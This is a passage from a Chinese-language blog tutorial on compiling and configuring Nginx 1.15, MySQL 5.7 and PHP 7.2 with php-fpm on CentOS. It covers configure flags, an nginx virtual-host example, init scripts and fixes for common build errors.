CRLF</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u_char ngx_http_error_build_tail[] =</span><br><span class="line"><span class="string">&quot;&lt;hr&gt;&lt;center&gt;&quot;</span> NGINX_VER_BUILD <span class="string">&quot;&lt;/center&gt;&quot;</span> CRLF</span><br><span class="line"><span class="string">&quot;&lt;/body&gt;&quot;</span> CRLF</span><br><span class="line"><span class="string">&quot;&lt;/html&gt;&quot;</span> CRLF</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u_char ngx_http_error_tail[] =</span><br><span class="line"><span class="string">&quot;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&quot;</span> CRLF <span class="comment">//改这里</span></span><br><span class="line"><span class="string">&quot;&lt;/body&gt;&quot;</span> CRLF</span><br><span class="line"><span class="string">&quot;&lt;/html&gt;&quot;</span> CRLF</span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="编译Nginx-1"><a href="#编译Nginx-1" class="headerlink" title="编译Nginx"></a>编译Nginx</h2><h2 id="下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305-Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持"><a href="#下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305-Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持" class="headerlink" title="下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305 Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持"></a>下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305 Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持</h2><h2 id="在configure中可能遇到的问题："><a href="#在configure中可能遇到的问题：" class="headerlink" title="在configure中可能遇到的问题："></a>在configure中可能遇到的问题：</h2><ol><li>&#x2F;configure: error: the HTTP rewrite module requires the PCRE library. You can either disable the module by using –without-http_rewrite_module option, or install the PCRE library into the system, or build the PCRE library statically from the source with nginx by using –with-pcre&#x3D; option.</li></ol><p>解决办法：安装pcre-devel<br><code>yum -y install pcre-devel</code></p><ol start="2"><li>&#x2F;configure: error: the HTTP gzip module requires the zlib library. You can either disable the module by using –without-http_gzip_module option, or install the zlib library into the system, or build the zlib library statically from the source with nginx by using –with-zlib&#x3D; option.</li></ol><p>解决办法：安装zlib-devel<br><code>yum install -y zlib-devel</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www http]$ cd </span><br><span class="line">[root@www http]$ yum groupinstall &quot;Development tools&quot;</span><br><span class="line">[root@www http]$ yum -y install gcc wget gcc-c++ automake autoconf libtool libxml2-devel libxslt-devel perl-devel perl-ExtUtils-Embed pcre-devel openssl-devel</span><br><span class="line">[root@www http]$./configure \</span><br><span class="line">    --prefix=/usr/local/nginx \</span><br><span class="line">    --sbin-path=/usr/sbin/nginx \</span><br><span class="line">    --conf-path=/etc/nginx/nginx.conf \</span><br><span class="line">    --error-log-path=/var/log/nginx/error.log \</span><br><span class="line">    --http-log-path=/var/log/nginx/access.log \</span><br><span class="line">    --pid-path=/var/run/nginx.pid \</span><br><span class="line">    --lock-path=/var/run/nginx.lock \</span><br><span class="line">    --http-client-body-temp-path=/var/tmp/nginx/client \</span><br><span class="line">    --http-proxy-temp-path=/var/tmp/nginx/proxy \</span><br><span class="line">    --http-fastcgi-temp-path=/var/tmp/nginx/fcgi \</span><br><span class="line">    --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi \</span><br><span class="line">    --http-scgi-temp-path=/var/tmp/nginx/scgi \</span><br><span class="line">    --user=nginx \</span><br><span class="line">    --group=nginx \</span><br><span class="line">    --with-pcre \</span><br><span class="line">    --with-http_v2_module \</span><br><span class="line">    --with-http_ssl_module \</span><br><span class="line">    --with-http_realip_module \</span><br><span class="line">    --with-http_addition_module \</span><br><span class="line">    --with-http_sub_module \</span><br><span class="line">    --with-http_dav_module \</span><br><span class="line">    --with-http_flv_module \</span><br><span class="line">    --with-http_mp4_module \</span><br><span class="line">    --with-http_gunzip_module \</span><br><span class="line">    --with-http_gzip_static_module \</span><br><span class="line">    --with-http_random_index_module \</span><br><span class="line">    --with-http_secure_link_module \</span><br><span class="line">    --with-http_stub_status_module \</span><br><span class="line">    --with-http_auth_request_module \</span><br><span class="line">    --with-mail \</span><br><span class="line">    --with-mail_ssl_module \</span><br><span class="line">    --with-file-aio \</span><br><span class="line">    --with-threads \</span><br><span class="line">    --with-stream \</span><br><span class="line">    --with-stream_ssl_module</span><br><span class="line">[root@www nginx-1.15.6]$ make -j2 &amp;&amp; make install</span><br><span class="line">[root@www nginx-1.15.6]$ mkdir -pv /var/tmp/nginx/client</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p>进入conf目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ cd /etc/nginx/</span><br></pre></td></tr></table></figure><p>然后编辑nginx.conf为如下内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user nginx www;</span><br><span class="line">worker_processes  auto;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line">    #虚拟主机</span><br><span class="line">    include /home/wwwroot/vhost/*.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到配置文件的最后一句，大家应该能想到这么做是为了多虚拟主机支持，可以分别管理每个虚拟主机的配置文件。当然如果你确定你的服务器上不会有第二个网站，也可以把server节配置都写到nginx.conf文件里。</p><h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><p>虚拟主机目录为：<code>/home/wwwroot/vhost/</code></p><p>Demo:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80; #监听端口</span><br><span class="line">    listen [::]:80; #IPV6支持</span><br><span class="line">    #listen 443 spdy; #https</span><br><span class="line">    #listen [::]:443 spdy; #IPV6 HTTPS</span><br><span class="line">    server_name www.example.com; #您的域名</span><br><span class="line">    index index.html index.php;</span><br><span class="line"></span><br><span class="line">    set $subdomain &#x27;&#x27;;</span><br><span class="line">    root  /home/www/www.example.com$subdomain;</span><br><span class="line">    #include /home/www/rewrite/xxx.conf; #包含rewrite规则文件</span><br><span class="line">    </span><br><span class="line">    ### SSL 配置，如果您需要，请取消本段的注释并做好配置</span><br><span class="line">    #ssl on;</span><br><span class="line">    #ssl_protocols TLSv1.2 TLSv1.1 TLSv1;</span><br><span class="line">    #ssl_ciphers CHACHA20:GCM:CFB:HIGH:!DH:!RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age=31536000; includeSubdomains; preload&quot;;</span><br><span class="line">    #ssl_prefer_server_ciphers on;</span><br><span class="line">    #ssl_stapling on;</span><br><span class="line">    #ssl_stapling_verify on;</span><br><span class="line">    #ssl_certificate /path/to/public.crt;</span><br><span class="line">    #ssl_certificate_key /path/to/private.key;</span><br><span class="line">    ############</span><br><span class="line"></span><br><span class="line">    location ~ .*.php(/.*)*$</span><br><span class="line">    &#123;</span><br><span class="line">        fastcgi_pass  unix:/tmp/php-cgi-www.example.com.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi.conf;</span><br><span class="line">        #fastcgi_param HTTPS $https if_not_empty; #如果是HTTPS站点请取消此行注释</span><br><span class="line">        fastcgi_param DOCUMENT_ROOT /home/wwwroot/domain/www.example.com$subdomain;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME  /home/wwwroot/domain/www.example.com$subdomain$fastcgi_script_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|flv|mp3|wma)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      30d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(js|css)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      12h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log off; </span><br><span class="line">    error_log /dev/null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加SysV-启动脚本"><a href="#添加SysV-启动脚本" class="headerlink" title="添加SysV 启动脚本"></a>添加SysV 启动脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ vim /etc/init.d/nginx</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># nginx - this script starts and stops the nginx daemon</span></span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># chkconfig:   - 85 15</span></span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">description: Nginx is an HTTP(S) server, HTTP(S) reverse \ </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">              proxy and IMAP/POP3 proxy server</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">processname: nginx</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">config:      /etc/nginx/nginx.conf</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">config:      /etc/sysconfig/nginx</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">pidfile:     /var/run/nginx.pid</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Source <span class="keyword">function</span> library.</span> </span><br><span class="line">. /etc/rc.d/init.d/functions</span><br><span class="line"><span class="meta"># </span><span class="language-bash">Source networking configuration.</span> </span><br><span class="line">. /etc/sysconfig/network</span><br><span class="line"><span class="meta"># </span><span class="language-bash">Check that networking is up.</span> </span><br><span class="line">[ &quot;$NETWORKING&quot; = &quot;no&quot; ] &amp;&amp; exit 0</span><br><span class="line">nginx=&quot;/usr/sbin/nginx&quot;</span><br><span class="line">prog=$(basename $nginx)</span><br><span class="line">NGINX_CONF_FILE=&quot;/etc/nginx/nginx.conf&quot;</span><br><span class="line">[ -f /etc/sysconfig/nginx ] &amp;&amp; . /etc/sysconfig/nginx</span><br><span class="line">lockfile=/var/lock/subsys/nginx</span><br><span class="line">start() &#123;</span><br><span class="line">    [ -x $nginx ] || exit 5</span><br><span class="line">    [ -f $NGINX_CONF_FILE ] || exit 6</span><br><span class="line">    echo -n $&quot;Starting $prog: &quot; </span><br><span class="line">    daemon $nginx -c $NGINX_CONF_FILE</span><br><span class="line">    retval=$?</span><br><span class="line">    echo </span><br><span class="line">    [ $retval -eq 0 ] &amp;&amp; touch $lockfile</span><br><span class="line">    return $retval</span><br><span class="line">&#125;</span><br><span class="line">stop() &#123;</span><br><span class="line">    echo -n $&quot;Stopping $prog: &quot; </span><br><span class="line">    killproc $prog -QUIT</span><br><span class="line">    retval=$?</span><br><span class="line">    echo </span><br><span class="line">    [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile</span><br><span class="line">    return $retval</span><br><span class="line">killall -9 nginx</span><br><span class="line">&#125;</span><br><span class="line">restart() &#123;</span><br><span class="line">    configtest || return $?</span><br><span class="line">    stop</span><br><span class="line">    sleep 1</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line">reload() &#123;</span><br><span class="line">    configtest || return $?</span><br><span class="line">    echo -n $&quot;Reloading $prog: &quot; </span><br><span class="line">    killproc $nginx -HUP</span><br><span class="line">RETVAL=$?</span><br><span class="line">    echo </span><br><span class="line">&#125;</span><br><span class="line">force_reload() &#123;</span><br><span class="line">    restart</span><br><span class="line">&#125;</span><br><span class="line">configtest() &#123;</span><br><span class="line"><span class="meta">$</span><span class="language-bash">nginx -t -c <span class="variable">$NGINX_CONF_FILE</span></span></span><br><span class="line">&#125;</span><br><span class="line">rh_status() &#123;</span><br><span class="line">    status $prog</span><br><span class="line">&#125;</span><br><span class="line">rh_status_q() &#123;</span><br><span class="line">    rh_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">    start)</span><br><span class="line">        rh_status_q &amp;&amp; exit 0</span><br><span class="line">    $1</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        rh_status_q || exit 0</span><br><span class="line">        $1</span><br><span class="line">        ;;</span><br><span class="line">    restart|configtest)</span><br><span class="line">        $1</span><br><span class="line">        ;;</span><br><span class="line">    reload)</span><br><span class="line">        rh_status_q || exit 7</span><br><span class="line">        $1</span><br><span class="line">        ;;</span><br><span class="line">    force-reload)</span><br><span class="line">        force_reload</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        rh_status</span><br><span class="line">        ;;</span><br><span class="line">    condrestart|try-restart)</span><br><span class="line">        rh_status_q || exit 0</span><br><span class="line">            ;;</span><br><span class="line">    *)</span><br><span class="line">      echo $&quot;Usage: $0 &#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;&quot; </span><br><span class="line">        exit 2</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>赋予脚本执行权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ chmod +x /etc/init.d/nginx</span><br></pre></td></tr></table></figure><p>添加至服务管理列表，设置开机启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ chkconfig --add nginx</span><br><span class="line">[root@www nginx-1.15.6]$ chkconfig  nginx on</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ service nginx start</span><br></pre></td></tr></table></figure><h1 id="编译安装MySQL"><a href="#编译安装MySQL" class="headerlink" title="编译安装MySQL"></a>编译安装MySQL</h1><p>依次执行以下命令检查系统中是否存在使用 rpm 安装的 MySQL 或者 MariaDB。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">rpm -qa | grep mysql</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">rpm -qa | grep mariadb</span></span><br></pre></td></tr></table></figure><p>如果已经安装，则运行以下任一个命令删除。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">rpm -e 软件名    <span class="comment">#注意：这里的软件名必须包含软件的版本信息，如rpm -e mariadb-libs-5.5.52-1.el7.x86_64。一般使用此命令即可卸载成功。</span></span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">rpm -e --nodeps 软件名   <span class="comment">#卸载不成功时使用此命令强制卸载</span></span></span><br></pre></td></tr></table></figure><p>依次运行以下命令安装 MySQL。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">yum install -y libaio-*    <span class="comment">#安装依赖</span></span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -p /usr/local/mysql</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">cd</span> /make</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">tar -xzvf mysql-5.7.24-el7-x86_64.tar.gz</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">mv</span> mysql-5.7.24-el7-x86_64/* /usr/local/mysql/</span></span><br></pre></td></tr></table></figure><p>依次运行以下命令建立 mysql 组和用户，并将 mysql 用户添加到 mysql 组。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">groupadd mysql</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">useradd -g mysql -s /sbin/nologin mysql</span></span><br></pre></td></tr></table></figure><h2 id="运行命令初始化-MySQL-数据库。"><a href="#运行命令初始化-MySQL-数据库。" class="headerlink" title="运行命令初始化 MySQL 数据库。"></a>运行命令初始化 MySQL 数据库。</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">/usr/local/mysql/bin/mysqld --initialize-insecure --datadir=/usr/local/mysql/data/ --user=mysql</span></span><br></pre></td></tr></table></figure><p>这一步可能会报错：<code>/usr/local/mysql/bin/mysqld: error while loading shared libraries: libnuma.so.1: cannot open shared object file: No such file or directory</code><br>这是缺少numactl。这个时候运行<code>yum -y install numactl</code>就可以解决这个问题了. </p><h2 id="更改-mysql-安装目录的属性"><a href="#更改-mysql-安装目录的属性" class="headerlink" title="更改 mysql 安装目录的属性"></a>更改 mysql 安装目录的属性</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">chown</span> -R mysql:mysql /usr/local/mysql</span></span><br></pre></td></tr></table></figure><h2 id="依次运行以下命令设置开机自启动"><a href="#依次运行以下命令设置开机自启动" class="headerlink" title="依次运行以下命令设置开机自启动"></a>依次运行以下命令设置开机自启动</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">cd</span> /usr/local/mysql/support-files/</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">cp</span> mysql.server  /etc/init.d/mysqld</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">chmod</span> +x /etc/init.d/mysqld</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">chkconfig --add mysqld</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">chkconfig  mysqld on</span></span><br></pre></td></tr></table></figure><h2 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">vim /root/.bash_profile</span></span><br><span class="line">PATH=$PATH:$HOME/bin:/usr/local/mysql/bin:/usr/local/mysql/lib</span><br><span class="line"><span class="meta"># </span><span class="language-bash">再原来的基础上加入mysql</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">source</span> /root/.bash_profile  <span class="comment">#重新执行文件</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/ie8NFy8.jpg"></p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">service mysqld start</span></span><br></pre></td></tr></table></figure><p><img src="/images/hlKbZhw.jpg"></p><h1 id="编译安装PHP-fpm"><a href="#编译安装PHP-fpm" class="headerlink" title="编译安装PHP-fpm"></a>编译安装PHP-fpm</h1><p>Nginx本身不能处理PHP，作为web服务器，当它接收到请求后，不支持对外部程序的直接调用或者解析，必须通过FastCGI进行调用。如果是PHP请求，则交给PHP解释器处理，并把结果返回给客户端。PHP-FPM是支持解析php的一个FastCGI进程管理器。提供了更好管理PHP进程的方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><h2 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/home/www@31]$ </span><span class="language-bash">yum install -y libmcrypt* mhash* libxml2 libxml2-devel bzip2 bzip2-devel freetype.x86_64 freetype-devel.x86_64 libjpeg-turbo-devel libcurl-devel libpng libpng-devel</span></span><br></pre></td></tr></table></figure><p>可能会提示：<code>No package libmcrypt* available.</code><br>此时拓展下更新源然后更新下就OK了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/home/www@32]$ </span><span class="language-bash">yum  install epel-release</span></span><br><span class="line"><span class="meta">[www@root@/home/www@33]$ </span><span class="language-bash">yum  update</span></span><br><span class="line"><span class="meta">[www@root@/home/www@34]$ </span><span class="language-bash">yum install libmcrypt libmcrypt-devel mcrypt mhash</span></span><br></pre></td></tr></table></figure><p>然后进入<code>make</code>目录 解压php并编译安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/make@20]~$ </span><span class="language-bash"><span class="built_in">cd</span> php-7.2.12</span></span><br><span class="line">[www@root@/make/php-7.2.12@21]~$ ./configure \</span><br><span class="line">  --prefix=/usr/local/php \</span><br><span class="line">  --enable-mysqlnd \</span><br><span class="line">  --with-mysqli=mysqlnd --with-openssl \</span><br><span class="line">  --with-pdo-mysql=mysqlnd \</span><br><span class="line">  --enable-mbstring \</span><br><span class="line">  --with-freetype-dir \</span><br><span class="line">  --with-gd \</span><br><span class="line">  --with-jpeg-dir \</span><br><span class="line">  --with-png-dir \</span><br><span class="line">  --with-zlib --with-libxml-dir=/usr \</span><br><span class="line">  --enable-xml  --enable-sockets \</span><br><span class="line">  --with-mcrypt  --with-config-file-path=/etc \</span><br><span class="line">  --with-config-file-scan-dir=/etc/php.d \</span><br><span class="line">  --enable-maintainer-zts \</span><br><span class="line">  --disable-fileinfo  --with-bz2\</span><br><span class="line">  --enable-fpm\</span><br><span class="line">  --with-curl\</span><br><span class="line">  --enable-pcntl\</span><br><span class="line">  --without-pear</span><br></pre></td></tr></table></figure><p>可能会提示<code>configure: WARNING: unrecognized options: --with-mcrypt</code><br>根据:<a href="https://github.com/kasparsd/php-7-debian/issues/55">https://github.com/kasparsd/php-7-debian/issues/55</a></p><blockquote><p>In PHP 7.2 the following configuration options are no longer supported</p><ul><li>with-mcrypt</li><li>with-mysql</li></ul><p>Remove ‘with-mcrypt’ - it’s deprecated since PHP 7.1</p></blockquote><p>PHP7.1开始已经移除了mcrypt<br>因此删除上面的 <code> --with-mcrypt  --with-config-file-path=/etc \</code>再执行遍</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/make/php-7.2.12@22]~$ ./configure \</span><br><span class="line">  --prefix=/usr/local/php \</span><br><span class="line">  --enable-mysqlnd \</span><br><span class="line">  --with-mysqli=mysqlnd --with-openssl \</span><br><span class="line">  --with-pdo-mysql=mysqlnd \</span><br><span class="line">  --enable-mbstring \</span><br><span class="line">  --with-freetype-dir \</span><br><span class="line">  --with-gd \</span><br><span class="line">  --with-jpeg-dir \</span><br><span class="line">  --with-png-dir \</span><br><span class="line">  --with-zlib --with-libxml-dir=/usr \</span><br><span class="line">  --enable-xml  --enable-sockets \</span><br><span class="line">  --with-config-file-scan-dir=/etc/php.d \</span><br><span class="line">  --enable-maintainer-zts \</span><br><span class="line">  --disable-fileinfo  --with-bz2\</span><br><span class="line">  --enable-fpm\</span><br><span class="line">  --with-curl\</span><br><span class="line">  --enable-pcntl\</span><br><span class="line">  --without-pear</span><br></pre></td></tr></table></figure><p>然后<code>make -j6 &amp;&amp; make -j6 install</code></p><h2 id="添加php和php-fpm配置文件"><a href="#添加php和php-fpm配置文件" class="headerlink" title="添加php和php-fpm配置文件"></a>添加php和php-fpm配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/make@30]~$ </span><span class="language-bash"><span class="built_in">cp</span> /make/php-7.2.12/php.ini-production /etc/php.ini</span></span><br><span class="line"><span class="meta">[www@root@/make@31]~$ </span><span class="language-bash"><span class="built_in">cd</span> /usr/local/php/etc/</span></span><br><span class="line"><span class="meta">[www@root@/make@32]~$ </span><span class="language-bash"><span class="built_in">cp</span> php-fpm.conf.default php-fpm.conf</span></span><br><span class="line"><span class="meta">[www@root@/usr/local/php/etc@33]~$ </span><span class="language-bash">sed -i <span class="string">&#x27;s@;pid = run/php-fpm.pid@pid = /usr/local/php/var/run/php-fpm.pid@&#x27;</span> php-fpm.conf</span></span><br></pre></td></tr></table></figure><h2 id="设置PHP环境变量"><a href="#设置PHP环境变量" class="headerlink" title="设置PHP环境变量"></a>设置PHP环境变量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/usr/local/php/etc@34]~$ </span><span class="language-bash">vi /root/.bash_profile</span></span><br><span class="line">PATH=$PATH:$HOME/bin:/usr/local/mysql/bin:/usr/local/mysql/lib:/usr/local/php/bin</span><br></pre></td></tr></table></figure><p>在PATH后面加上<code> /usr/local/php/bin</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/usr/local/php/etc@35]~$ </span><span class="language-bash"><span class="built_in">source</span> /root/.bash_profile  <span class="comment">#重新执行文件</span></span></span><br></pre></td></tr></table></figure><h2 id="添加php-fpm启动脚本"><a href="#添加php-fpm启动脚本" class="headerlink" title="添加php-fpm启动脚本"></a>添加php-fpm启动脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/usr/local/php/etc@36]~$ </span><span class="language-bash"><span class="built_in">cp</span> /make/php-7.2.12/sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm</span></span><br><span class="line"><span class="meta">[www@root@/usr/local/php/etc@37]~$ </span><span class="language-bash"><span class="built_in">chmod</span> +x /etc/init.d/php-fpm</span></span><br></pre></td></tr></table></figure><h2 id="添加php-fpm至服务列表并设置开机自启"><a href="#添加php-fpm至服务列表并设置开机自启" class="headerlink" title="添加php-fpm至服务列表并设置开机自启"></a>添加php-fpm至服务列表并设置开机自启</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/usr/local/php/etc@38]~$ </span><span class="language-bash">chkconfig --add php-fpm</span>  </span><br><span class="line"><span class="meta">[www@root@/usr/local/php/etc@39]~$ </span><span class="language-bash">chkconfig --list php-fpm</span></span><br><span class="line"></span><br><span class="line">Note: This output shows SysV services only and does not include native</span><br><span class="line">      systemd services. SysV configuration data might be overridden by native</span><br><span class="line">      systemd configuration.</span><br><span class="line"></span><br><span class="line">      If you want to list systemd services use &#x27;systemctl list-unit-files&#x27;.</span><br><span class="line">      To see services enabled on particular target use</span><br><span class="line">      &#x27;systemctl list-dependencies [target]&#x27;.</span><br><span class="line"></span><br><span class="line">php-fpm        0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line"><span class="meta">[www@root@/usr/local/php/etc@40]~$ </span><span class="language-bash">chkconfig php-fpm on</span></span><br><span class="line"><span class="meta">[www@root@/usr/local/php/etc@41]~$ </span><span class="language-bash"><span class="built_in">cd</span> /usr/local/php/etc/php-fpm.d</span></span><br><span class="line">[www@root@/usr/local/php/etc/php-fpm.d@42]~$ cp www.conf.default www.conf</span><br></pre></td></tr></table></figure><h2 id="启动服务-1"><a href="#启动服务-1" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/usr/local/php/etc/php-fpm.d@43]~$ service php-fpm start</span><br><span class="line">Starting php-fpm  done</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="添加nginx对fastcgi的支持"><a href="#添加nginx对fastcgi的支持" class="headerlink" title="添加nginx对fastcgi的支持"></a>添加nginx对fastcgi的支持</h2><h3 id="主文件模式"><a href="#主文件模式" class="headerlink" 